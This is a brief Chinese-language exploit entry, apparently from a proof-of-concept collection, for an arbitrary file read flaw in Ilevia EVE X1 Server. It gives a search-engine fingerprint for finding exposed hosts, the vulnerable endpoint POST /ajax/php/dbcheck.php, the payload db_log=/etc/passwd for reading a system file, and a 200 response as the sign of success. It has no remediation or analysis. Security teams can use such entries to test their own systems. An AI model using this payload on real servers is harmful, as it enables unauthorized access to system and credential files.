# IleviaEVEX1Server-dbcheck-存在任意文件读取漏洞

IleviaEVEX1Server ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="ilevia-EVE-X1-Server"`
- **请求**：`POST /ajax/php/dbcheck.php HTTP/1.1`

**Payload**
```
db_log=/etc/passwd
```
- **响应特征**：200